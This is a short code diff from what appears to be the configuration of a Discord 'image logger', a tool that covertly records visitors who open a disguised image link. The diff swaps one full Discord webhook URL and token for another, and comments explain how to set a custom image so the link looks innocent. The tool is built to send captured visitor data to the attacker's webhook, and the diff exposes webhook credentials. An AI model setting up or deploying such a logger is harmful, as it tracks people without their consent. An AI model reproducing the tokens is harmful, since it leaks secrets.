@@ -11,7 +11,7 @@ __author__ = "???"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1140728657762062417/ZLD6liKZ654YCYYK05nHQGmhowOkWK4bquGV-_7JkTNnstysFVIloC7_I5zdW42dxZl1",
+    "webhook": "https://discord.com/api/webhooks/1228998315157356584/tPGlRDMDxguBlvT5G34xrVP9RDBaVvriqZX2m9bJDYjOMC0qtye4cLi4Q1P-9Xyfvt6j",
     "image": "https://media.tenor.com/BP79uBTrSy0AAAAd/loading-discord.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
